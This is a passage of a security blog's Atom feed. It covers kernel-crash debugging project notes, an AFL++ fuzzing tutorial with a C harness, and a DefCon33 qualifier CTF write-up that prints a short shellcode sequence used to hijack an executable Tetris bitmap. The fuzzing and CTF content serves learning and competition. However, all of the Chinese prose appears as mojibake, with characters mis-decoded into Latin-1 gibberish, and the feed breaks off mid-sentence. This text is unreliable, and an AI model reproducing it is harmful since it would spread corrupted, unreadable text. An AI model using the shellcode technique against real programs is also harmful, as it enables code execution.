class="lvl-3"><p><code>$BASE_PATH/perform_sample_build_and_reproduction.py</code> è·Ÿè¸ªä»»åŠ¡çŠ¶æ€ã€‚è¿™ä¸ªç¨‹åºå¯¹æ¯ä¸€ä¸ªæœ€åˆkGymæ¶æ„å›¾ä¸­çš„å®ä¾‹éƒ½åšäº†ä¸€ä¸ªç±»ã€‚</p></li><li class="lvl-3"><p><code>kernel_bench_evaluator.py</code> ä»ä»»åŠ¡æŠ¥å‘Šä¸­è¯»å–æ‰§è¡Œç»“æœå¹¶ä¸”è·Ÿè¸ªé‡å¤æµ‹è¯•ï¼Œè¿ç»­æˆåŠŸ3æ¬¡ï¼Œæœ€å¤§å°è¯•æ¬¡æ•°5.</p></li></ol><h2 id="å¹³å°æµ‹è¯•ï¼š">å¹³å°æµ‹è¯•ï¼š</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">export $KEBCH_EXPR_PATH=&quot;&quot;</span><br><span class="line">python $KBENCH_EXPR_PATH/inference/make_datasets/create_text_dataset.py \</span><br><span class="line">--dataset_name_or_path=&quot;$KBENCH_EXPR_PATH/dataset/kernel_bench_data.json&quot; \</span><br><span class="line">--splits=&quot;train&quot; \</span><br><span class="line">--output_dir=&quot;$KBENCH_EXPR_PATH/dataset_results/parent_commit&quot; \</span><br><span class="line">--retrieval_file=&quot;$KBENCH_EXPR_PATH/index_results/parent_commit/kernel_bench_data/file_name_and_contents.retrieval.jsonl&quot; \</span><br><span class="line">--read_linux_from=&quot;$KBENCH_EXPR_PATH/index_results/parent_commit/kernel_bench_data/file_name_and_contents_indexes&quot; \</span><br><span class="line">--file_source=&quot;oracle&quot; \</span><br><span class="line">--max_context_len=16000 \</span><br><span class="line">--tokenizer_name=&quot;cl100k&quot; \</span><br><span class="line">--problem_statement_max_tokens=10000 \</span><br><span class="line">--commit_type=&quot;parent_commit&quot;</span><br></pre></td></tr></table></figure><h2 id="æˆ‘ä»¬çš„">æˆ‘ä»¬çš„</h2><h3 id="cur">cur</h3><p>è¿›ä¸€æ­¥æ·»åŠ vmcoreä¿¡æ¯æå–å·¥å…·ï¼Œç»™å‡ºäº†å¯„å­˜å™¨ä¿¡æ¯ã€‚ä¸è¿‡è¦è€ƒè™‘ä¸Šä¸‹æ–‡å‹ç¼©ï¼Ÿä¸è¦å¤ªå¤šæ²¡ç”¨çš„ä¿¡æ¯</p><p>gdb miå‘½ä»¤ï¼Ÿæ¨ç¿»é‡æ„ï¼Œç›´æ¥ç”¨MIå‘½ä»¤å®ç°</p><p>kgymè·å–æºä»£ç ä¿¡æ¯é çš„æ˜¯å´©æºƒdmesgåœ¨å†…æ ¸ä»£ç åº“ä¸­ç”¨bm25åšå…¨å±€ç›¸å…³åº¦æ£€ç´¢ï¼Œæˆ‘ä»¬ç”¨lspç›´æ¥å¯ä»¥æ‹‰å‡ºæ¥å‡½æ•°å¼•ç”¨ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨ä»£ç æœ¬èº«çš„è¯­ä¹‰ç›¸å…³</p><p>å°è£…å·¥å…·</p><p>ä»–æ˜¯è¦æ‹¿åˆ°ä¸€ä¸ªsyzbotå´©æºƒæŠ¥å‘Šçš„å…·ä½“å¤ç°ç¯å¢ƒç„¶åç»™MCPæœåŠ¡å™¨ã€‚æ€è·¯ä¸Šæ˜¯ä»syzbotç½‘ç«™æ‹¿åˆ°ç›¸å…³çš„å†…å®¹-&gt;è‡ªåŠ¨åŒ–æ„å»º-&gt;qemuè¿è¡Œå†…æ ¸+pocè¿æ¥gdbï¼ŒåŒæ—¶æä¾›æºç æœç´¢</p><p>æˆ‘ä»¬å¦‚æœvmcoreåˆ†æå®Œå…¨ä¸éœ€è¦é‚£ä¹ˆå¤šç¯å¢ƒï¼Ÿæˆ‘ä»¬ä¸å…³å¿ƒvmcoreæ˜¯å“ªæ¥çš„ï¼Œæœ‰ä¸€ä¸ªvmcoreç°åœº</p><p>æ›´ç°ä»£çš„åŒ…ç®¡ç†å™¨-uv</p><p>æä¾›çš„é¡¹ç›®æ˜¯æ€ä¹ˆåšçš„ï¼Ÿæˆ‘ä»¬èƒ½ä¸èƒ½å¿«é€Ÿåœ°æ¨¡ä»¿ï¼Ÿ</p><h2 id="1-æä¾›çš„é¡¹ç›®æ€ä¹ˆåšçš„ï¼Ÿ">1. æä¾›çš„é¡¹ç›®æ€ä¹ˆåšçš„ï¼Ÿ</h2><p>å¿½ç•¥ida-pro-mcpçš„éƒ¨åˆ†åç«¯é€»è¾‘å¤§æ¦‚æ‡‚äº†ï¼Œæ”¹ä¸€ä¸‹å¯ä»¥ç”¨ã€‚</p><p>è‡ªåŠ¨åŒ–æå–vmcoreï¼Ÿï¼Ÿå…ˆè·‘</p><p>æƒ³åŠæ³•æä¸€ä¸ªå¼€ç®±å³ç”¨çš„ç¯å¢ƒï¼Œ</p><p>zjl</p><ul class="lvl-0"><li class="lvl-2"><p>ï¼ˆå°½å¯èƒ½ï¼‰å¼€ç®±å³ç”¨çš„vmcoreæå–ç¯å¢ƒ</p></li><li class="lvl-2"><p>é¡ºåºåŒ–çš„å†…æ ¸å´©æºƒè°ƒè¯•/vmcoreåˆ†æé€»è¾‘</p></li></ul><p>wjgï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>æ‰‹åŠ¨åŒ– ä»ä¸€ä¸ªé…ç½® æºç -&gt;build-&gt;æµ‹è¯•poc-&gt;å´©æºƒ-&gt;</p></li></ul><p>wzx:</p><ul class="lvl-0"><li class="lvl-2"><p>ai</p></li></ul><p>1 2 3 4</p><h2 id="è®ºæ–‡å†…å®¹">è®ºæ–‡å†…å®¹</h2><p>å¯¹äºæ¯ä¸ªäººå®ç°çš„å†…å®¹è®ºæ–‡ä¸­è¦å†™ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>ç‰¹è‰²æè¿°</p></li><li class="lvl-2"><p>æ¨¡å—è®¾è®¡æµ‹è¯•ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p></li></ul><p>ç³»ç»Ÿè®¾è®¡æœ€åå†è¯´</p><p>å›¾æ¶æ„å›¾</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æœ€è¿‘æ›´æ–°2025-04-05ï¼ŒåŸºäºChatDBGå’Œkdump-gdbserverå®ç°äº†pythonä¾¿åˆ©åœ°è·å–è°ƒè¯•ä¿¡æ¯ã€‚æœ€è¿‘æ›´æ–°2025-04-17ï¼Œå¯¹è„šæœ¬åšäº†è¿›ä¸€æ­¥å°è£…ä¸”å°è¯•æ–°çš„æ€è·¯æœ€è¿‘æ›´æ–°2025-4-24ï¼Œè®°å½•äº†æ€è·¯çš„å˜åŒ–ï¼Œç°åœ¨æ€è·¯ä»clang</summary>
      
    
    
    
    <category term="others" scheme="https://zjw1nd.github.io/categories/others/"/>
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="develop" scheme="https://zjw1nd.github.io/tags/develop/"/>
    
  </entry>
  
  <entry>
    <title>ä»0å¼€å§‹çš„AFL++</title>
    <link href="https://zjw1nd.github.io/2025/04/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus/"/>
    <id>https://zjw1nd.github.io/2025/04/30/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus/</id>
    <published>2025-04-30T07:42:49.000Z</published>
    <updated>2025-07-22T08:48:54.074Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ğŸ“–å­¦ä¹ è·¯çº¿ AFL++ -&gt; LibAFL</p></blockquote><h1>å®‰è£…å’Œä½¿ç”¨ä»¥åŠåŸºæœ¬æ¦‚å¿µ</h1><p>archä¸€é”®allinå°±è¡Œã€‚</p><p>afl++æ˜¯ä¸€ä¸ªåŸºäºaflçš„æ”¹è¿›ç‰ˆå¼€æºæ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚å¯¹äºfuzzæ¥è¯´ï¼Œåˆ†ä¸ºæœ‰æºç å’Œæ— æºç çš„ç‰ˆæœ¬ã€‚aflåŸºäºclangå®ç°äº†ä¸€ä¸ªå®šåˆ¶çš„ç¼–è¯‘å™¨<code>afl-clang</code>ç³»åˆ—ã€‚afl-clangèƒ½é€šè¿‡ç¼–è¯‘æ—¶æ’æ¡©æ¥ä¸ºaflæä¾›ä»£ç è¦†ç›–ç‡ç›‘æ§ç­‰åŠŸèƒ½ã€‚åŒæ—¶å®ƒè¿˜æœ‰qemu modeèƒ½æä¾›æ— æºç fuzzï¼Œ</p><p>æœ‰ä¸€ä¸ª<a href="https://github.com/mykter/afl-training">afl-training</a>é¡¹ç›®å¯ä»¥å¸®æˆ‘ä»¬ä¸Šæ‰‹æŒæ¡ç›¸å…³çš„å†…å®¹ï¼Œè¿™é‡Œä»¥quckstartä¸ºä¾‹ç®€å•ä»‹ç»afl++æ‰§è¡Œçš„å…¥é—¨æµç¨‹ã€‚</p><h2 id="Quickstart">Quickstart</h2><p>åœ¨æœ‰æºç ï¼ˆcï¼‰çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨<code>CC=afl-clang-fast</code>æ¥ç¼–è¯‘æˆ‘ä»¬éœ€è¦æµ‹è¯•çš„ç¨‹åºã€‚åœ¨aflç¼–è¯‘å™¨å®Œæˆæ’æ¡©ç¼–è¯‘ä¹‹åï¼Œæ‰§è¡Œ<code>afl-fuzz -i inputs -o out ./vulnerable</code>å³å¯ã€‚<code>-i</code>æŒ‡å®šäº†è¾“å…¥ç§å­çš„æ–‡ä»¶å¤¹ï¼Œ<code>-o</code>æŒ‡å®šäº†å´©æºƒè¾“å‡ºçš„æ–‡ä»¶å¤¹ã€‚å¿«é€Ÿå¯åŠ¨å°±è¿™ä¹ˆå®¹æ˜“ã€‚æˆ‘ä»¬åº”å½“çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š<br><img src="images/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus.md/afl-screenshot.png" alt="alt text"></p><p>å¦‚æœä¸åšä»»ä½•å¤„ç†ï¼Œaflé»˜è®¤ä¼šå¯¹æ ‡å‡†è¾“å…¥è¿›è¡Œfuzzã€‚</p><h2 id="Harness">Harness</h2><p>harnessçš„è‹±æ–‡æ­£å¼ç¿»è¯‘æ˜¯â€œç³»å¸¦/ï¼ˆé©¬ï¼‰æŒ½å…·â€æˆ–æ˜¯â€œæ§åˆ¶/åˆ©ç”¨â€¦çš„åŠ¨åŠ›â€ã€‚åœ¨fuzzä¸­æŒ‡çš„æ˜¯ä¸€ä¸ªâ€œæ¥å£â€ã€‚AFLå¹¶ä¸çŸ¥é“æˆ‘ä»¬å…·ä½“è¦æµ‹è¯•ä»€ä¹ˆå‡½æ•°ï¼Œä¹Ÿä¸çŸ¥é“å‡½æ•°çš„è¾“å…¥æ˜¯ä»€ä¹ˆæ ·çš„å¦‚ä½•è¾“å…¥ï¼Œå› æ­¤è¿™å°±éœ€è¦æˆ‘ä»¬ç¼–å†™harnessã€‚</p><p>å¯¹äºfuzzä¸€ä¸ªæ¥å£/å‡½æ•°éœ€è¦å‡†å¤‡ä»€ä¹ˆï¼Œafl-trainingç»™å‡ºäº†ä»¥ä¸‹ä¸‰æ¡ï¼š</p><ol><li class="lvl-3"><p>ä»£ç éœ€è¦æ˜¯å¯æ‰§è¡Œçš„â€”â€”éœ€è¦ç¼–è¯‘æˆä¸€ä¸ªç¨‹åºã€‚</p></li><li class="lvl-3"><p>ä¸ºäº†è®© AFL æœ‰æ•ˆå·¥ä½œï¼Œä»£ç éœ€è¦è¢«æ’æ¡©ï¼ˆinstrumentedï¼‰â€”â€”æ‰€ä»¥æˆ‘ä»¬å¿…é¡»ç”¨ afl-clang-fastã€afl-clang æˆ– afl-gcc ä¹‹ä¸€è¿›è¡Œç¼–è¯‘ã€‚</p></li><li class="lvl-3"><p>ä¸ºäº†è®© AFL ç”Ÿæˆçš„æ•°æ®çœŸæ­£æµ‹è¯•åˆ°åº“å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ª harnessï¼Œå®ƒèƒ½æ¥æ”¶å¤–éƒ¨è¾“å…¥å¹¶ä¼ é€’ç»™åº“ã€‚è¿™å¯ä»¥é€šè¿‡å‘½ä»¤è¡ŒæŒ‡å®šçš„æ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥ä»æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰è¯»å–ã€‚</p></li></ol><p>æ‰€ä»¥æˆ‘ä»¬ç¼–å†™harnessçš„è¿‡ç¨‹ï¼Œå…¶å®æ˜¯æƒ³åŠæ³•è®©æ ‡å‡†è¾“å…¥ç¼“å†²åŒºå’Œç›®æ ‡å‡½æ•°å¯¹æ¥ï¼Œå¹¶ä¸”åœ¨ç»ˆç«¯æ›´åŠ ç”¨æˆ·å‹å¥½ã€‚å¯¹äºä¸€ä¸ªæ ‡å‡†çš„harnessç¤ºä¾‹ï¼Œæˆ‘ä»¬ç°åœ¨è¦å°è¯•fuzzè‡ªå®šä¹‰çš„<code>lib_echo</code>å’Œ<code>lib_mul</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºäºå¯¹ç›®æ ‡å‡½æ•°æœ€å¤§å¯èƒ½è¾“å…¥å¤§å°çš„å‡è®¾ï¼Œå®šä¹‰å›ºå®šå¤§å°çš„ç¼“å†²åŒº</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;echo&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ç¡®ä¿ç¼“å†²åŒºåˆå§‹åŒ–ï¼Œæ¶ˆé™¤ä¸è¾“å…¥æ— å…³çš„å˜é‡è¡Œä¸º</span></span><br><span class="line">        <span class="type">char</span> input[SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ssize_t</span> length;</span><br><span class="line">        length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">        lib_echo(input, length);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;mul&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> a,b = <span class="number">0</span>;</span><br><span class="line">        read(STDIN_FILENO, &amp;a, <span class="number">4</span>);</span><br><span class="line">        read(STDIN_FILENO, &amp;b, <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lib_mul(a,b));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s mul|echo\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out ./harness echo</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out ./harness mul</span><br></pre></td></tr></table></figure><p>å°±èƒ½è®©aflå¯¹è¿™ä¸¤ä¸ªå‡½æ•°åšfuzzã€‚è€Œè¿™ä¸ªä¸»å‡½æ•°å°±æ˜¯æˆ‘ä»¬å†™çš„harnessã€‚</p><h2 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œç»ˆç«¯æ‰§è¡Œafl-fuzzå¦‚æœæŠ¥é”™å®ƒä¼šè¾“å‡ºé”™è¯¯åŸå› çš„ã€‚</p><h2 id="å¸¸è§çš„å‚æ•°">å¸¸è§çš„å‚æ•°</h2><p>@@ï¼š å ä½ç¬¦</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/2483298">https://cloud.tencent.com/developer/article/2483298</a><br>qemuçº¯äºŒè¿›åˆ¶ä¸‹ï¼Œå…³äºfuzzçš„è°ƒä¼˜ã€‚æ¯”å¦‚è®¾ç½®aflå…¥å£ç‚¹ï¼Œé€‰æ‹©è¦è¦†ç›–çš„åŠ¨æ€åº“ï¼Œè®¾å®šcodeèµ·æ­¢åœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬é€šè¿‡é€†å‘+è®¾å®šä¸€å¤§å †ç¯å¢ƒå˜é‡ä¹Ÿå¯ä»¥å®ç°é’ˆå¯¹æ€§çš„fuzz</p></blockquote><h1>åŸç†</h1><p>è¿™æ˜¯afl++çš„æ¶æ„å›¾ï¼š<br><img src="images/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84AFLPlusPlus.md/overview.svg" alt="alt text"></p><h1>å®æˆ˜å°è¯•</h1><h1>LibAFL</h1><p>LibAFLæ˜¯ä¸€ä¸ªç”¨rustç¼–å†™çš„fuzzingå·¥å…·ï¼Œæä¾›äº†é«˜è‡ªå®šä¹‰çš„å¾ˆå¤šå·¥å…·ç”¨äºæ„å»ºè‡ªå·±çš„fuzzç¯å¢ƒã€‚</p><h1>golibafl</h1><h1>fuzz101</h1><p>è¿™æ˜¯ä¸€å¥—fuzzçš„æ•™ç¨‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ğŸ“–å­¦ä¹ è·¯çº¿ AFL++ -&amp;gt; LibAFL&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;å®‰è£…å’Œä½¿ç”¨ä»¥åŠåŸºæœ¬æ¦‚å¿µ&lt;/h1&gt;
&lt;p&gt;archä¸€é”®allinå°±è¡Œã€‚&lt;/p&gt;
&lt;p&gt;afl++æ˜¯ä¸€ä¸ªåŸºäºaflçš„æ”¹è¿›ç‰ˆå¼€æºæ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚å¯¹äºfuzzæ¥è¯´</summary>
      
    
    
    
    <category term="Exploits" scheme="https://zjw1nd.github.io/categories/Exploits/"/>
    
    
    <category term="fuzz" scheme="https://zjw1nd.github.io/tags/fuzz/"/>
    
    <category term="exploit" scheme="https://zjw1nd.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>DefCon33 Qual</title>
    <link href="https://zjw1nd.github.io/2025/04/14/DefCon33-Qual/"/>
    <id>https://zjw1nd.github.io/2025/04/14/DefCon33-Qual/</id>
    <published>2025-04-14T03:07:52.000Z</published>
    <updated>2025-04-22T02:30:02.336Z</updated>
    
    <content type="html"><![CDATA[<p>è·Ÿç€nu1lçš„å¤§ä½¬ä»¬æ‰“äº†defconé¢„é€‰ã€‚è¿™æ˜¯ä¸€å‘¨ä¹‹åçš„è®°å½•äº†ã€‚é˜Ÿä¼é‡Œæ²¡å•¥äººæ¥ï¼Œå’Œnu1lçš„å¤§è·Œä»¬å’Œåšäº†ä¸€æŠŠï¼ˆè™½ç„¶åªæ˜¯ç®€å•é¢˜ï¼‰ã€‚</p><h2 id="å…³äºé¢˜ç›®é£æ ¼">å…³äºé¢˜ç›®é£æ ¼</h2><p>é¦–å…ˆï¼Œdefconå¾ˆæ˜æ˜¾çš„ï¼Œé¢˜ç›®çš„ç§ç±»å¾ˆå¤šè€Œä¸”<strong>å¾ˆæ–°</strong>ã€‚å¾ˆå¤šä¸œè¥¿éƒ½å¾ˆå°ä¼—å˜æ€ã€‚</p><p>è€Œä¸”å¸¸è§„é¢˜ç›®æ˜¯ä¸æä¾›ç±»å‹çš„ï¼Œé™¤äº†webä»¥å¤–å‰©ä¸‹çš„å¤šå¤šå°‘å°‘éƒ½å¾ˆç»¼åˆï¼ˆè§‚å¯Ÿé¢‘é“ä¸­çš„å¸ˆå‚…ä»¬äº¤æµå¾—å‡ºçš„ç»“è®ºï¼‰ã€‚æˆ‘è‡ªå·±åšçš„ä¸¤é“é¢˜ç›®æ„Ÿè§‰éå¸¸miscï¼Œä¿„ç½—æ–¯æ–¹å—é‚£é“é¢˜å¾ˆå¥½ç©ã€‚</p><h2 id="å…³äºæˆ‘å‚ä¸çš„é¢˜ç›®">å…³äºæˆ‘å‚ä¸çš„é¢˜ç›®</h2><p>Nu1lçš„å¸ˆå‚…ä»¬å¾ˆå‰å®³è€Œä¸”äººå¤šï¼Œå„ä¸ªè¿˜éƒ½æ˜¯48hè¿è½´è½¬çš„å¤šçº¿ç¨‹ç²¾åŠ›æ€ªç‰©ï¼Œå¾ˆå¤šé¢˜å¼€é¢˜æ²¡æœ‰è·Ÿç€åšä¹Ÿå°±æ²¡å¿…è¦è®¨è®ºäº†ï¼ˆï¼‰ã€‚æˆ‘çœ‹çš„ä¸¤é“é¢˜æ°å¥½è¿˜éƒ½æ˜¯miscï¼Œæœ‰ä¸€ä¸ªå‡ºçš„å¾ˆå¥½ç©ã€‚</p><h3 id="tetrx">tetrx</h3><p>é¢˜ä¸éš¾ä½†æ˜¯å¾ˆæœ‰æ„æ€ï¼Œé€†å‘åˆ†æå¯ä»¥å‘ç°è¿™ç©æ„å®ç°äº†ä¸€ä¸ªç»ˆç«¯ä¿„ç½—æ–¯æ–¹å—ï¼ŒåŒæ—¶ç”¨ä¸€å—0x30çš„ï¼Œmmapå‡ºæ¥çš„bitmapå­˜å‚¨å½“å‰çš„åœ°å½¢çŠ¶æ€ä¿¡æ¯ã€‚</p><p>å¾ˆç®€å•çš„æµ‹è¯•è·‘å®Œå°±ä¼šå‘ç°æŠ¥é”™segfaultï¼Œè·Ÿè¿›ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªbitmapç»™äº†å¯æ‰§è¡Œæƒé™ã€‚åœ¨å¤±è´¥ä¹‹åä¼šç›´æ¥å»æ‰§è¡Œè¿™å—åœ°å€ï¼æ¢å¥è¯è¯´ï¼Œåªéœ€è¦ä¸€ä¸ª<strong>ç²¾ç®€ä¸”åˆé€‚</strong>çš„shellcodeï¼Œç„¶åé€šè¿‡ç©ä¿„ç½—æ–¯æ–¹å—çš„å½¢å¼ï¼Œå°±èƒ½ç›´æ¥æ‰§è¡Œscï¼Œç”šè‡³è¿™ä¸ªç¨‹åºè¿˜ç»™äº†åé—¨ã€‚</p><p>ä½†æ˜¯å¤§å®¶ä¸€å°è¯•å°±å‘ç°äº†ï¼Œå¹³å¸¸çš„shellcodeï¼ˆæ¯”å¦‚ç²¾ç®€ç‰ˆçš„pwntoolsæä¾›çš„é‚£ç§ï¼‰éšéšä¾¿ä¾¿å°±ä¼šè¶…é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯ä¸Šæ–¹æ ¹æœ¬æ²¡ç©ºé—´ç»™æˆ‘ä»¬åšæ“ä½œï¼Œæ‰€ä»¥éœ€è¦æ¯”è¾ƒå·§å¦™çš„scã€‚ç¡¬ç¼–ç çš„å­—ç¬¦ä¸²è‚¯å®šå°±ä¸è¦æƒ³äº†ã€‚è€Œä¸”0ä¹Ÿè¦å°½å¯èƒ½åœ°å°‘ã€‚</p><p>è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œæœ¬æ¥æƒ³ä½¿ç”¨å¯„å­˜å™¨+sub/addè°ƒæ•´åˆ°åé—¨ç›´æ¥jmpï¼Œä½†æ˜¯æ²¡æœ‰åˆé€‚çš„å¯„å­˜å™¨ã€‚è€Œä¸”addå’Œsubç«‹å³æ•°æŒ‡ä»¤ä¼šå¯¼è‡´0å¤ªå¤šï¼Œä¸å¥½æ„é€ ã€‚</p><p>ç„¶åæ€è·¯å°±è½¬å‘äº†é‡æ–°å†™ï¼Œå³æƒ³åŠæ³•è°ƒreadï¼Œè‡ªå·±æ§åˆ¶è¿™ç‰‡rwxå†…å­˜ã€‚åŒæ—¶ä½¿ç”¨popä»æ ˆä¸Šæ‹¿å½“å‰ä½ç½®çš„åœ°å€ï¼Œç„¶åxor rdiã€‚</p><p>æ²¡æƒ³åˆ°Nu1lé‡Œé¢è¿˜æœ‰ä¿„ç½—æ–¯æ–¹å—å¤§ç¥ï¼ˆï¼‰ç»™åœ°å½¢å°±èƒ½æ„é€ è¿™ä¸€å—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">pop rdx</span><br><span class="line">pop rdi</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">xor edi,edi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>ç”¨ç±»ä¼¼è¿™æ ·çš„asmæ ¼å¼æ„é€ ä¿„ç½—æ–¯æ–¹å—å°±è¡Œã€‚</p><h3 id="im-pio-ssible">im-pio-ssible</h3><p>é¦–å…ˆï¼Œé™„ä»¶å°±ç›´æ¥ä¸”åªæä¾›äº†æºä»£ç ï¼Œæ˜¯ä¸€ä¸ªæˆ‘æ²¡å¬è¯´è¿‡çš„è¯­è¨€<code>swift</code>ï¼Œæ˜¯macä¸Šç”¨çš„ã€‚ç›´æ¥AIè¯»æºç ï¼Œå‘ç°è¿™ç©æ„å®ç°äº†ä¸¤ä¸ªPIOé€šä¿¡ï¼ŒPIOè¿™ç©æ„å…¨åæ˜¯å¯ç¼–ç¨‹IOï¼Œæ˜¯æ ‘è“æ´¾ä¸Šçš„ä¸€ä¸ªä¸“ç”¨æ¨¡å—ï¼Œç±»ä¼¼dmaï¼Œæ˜¯å¯ä»¥åŸºäºæ—¶é’Ÿç‹¬ç«‹æ§åˆ¶çš„IOæ¨¡å—ã€‚</p><p>è¿™é‡Œæ˜¯<a href="https://dazzlingokami.github.io/2025/03/08/PIO%E5%8F%82%E8%80%83%E6%89%8B%E5%86%8C/">æ‰‹å†Œ</a>ï¼Œè¿™ç©æ„è°tmä¼šï¼Œä¸è¿‡è¿˜å¥½å®ƒçš„æ±‡ç¼–æŒ‡ä»¤å°±9æ¡ï¼Œç°å­¦+AIç»™ç¿»è¯‘è„šæœ¬ï¼Œå¾ˆå¿«ä¹Ÿèƒ½æŒæ¡ã€‚</p><p>è¿œç¨‹æœ‰ä¸‰ä¸ªjsonæ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªéƒ½æè¿°äº†ä¸€ä¸ªå‘é€æ•°æ®çš„ç›®æ ‡PIOï¼Œé€šè¿‡ä¸€ä¸ªå°±ä¼šè¿›ä¸‹ä¸€ä¸ªã€‚é¢˜ç›®ä¼šä¸ºæ¯ä¸ªå‘é€æ–¹éšæœºåŒ–7ä¸ª16ä½æ•°æ®æ”¾åœ¨PIOçš„FIFOå­˜å‚¨ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡åˆ†æé…ç½®å’Œæ—¶é’ŸåŒ¹é…ï¼Œæ¥åˆ›å»ºè‡ªå·±çš„æ¥æ”¶æ–¹PIOï¼Œå¹¶ä¸”ä»¥jsonæ ¼å¼ä¼ è¿›å»ã€‚å‘é€æ–¹çš„è¾“å‡ºFIFOå’Œæˆ‘ä»¬æ¥æ”¶æ–¹çš„è¾“å…¥FIFOæ˜¯ä¸€ä¸ªï¼Œåªè¦FIFOå†…æˆåŠŸæ¥æ”¶äº†è¿™äº›æ•°æ®ï¼Œé€šè¿‡äº†æ ¡éªŒå°±ä¼šç»™flagã€‚</p><p>äºŒè¿›åˆ¶æ–‡ä»¶å¤ªæäº†ï¼Œæºç 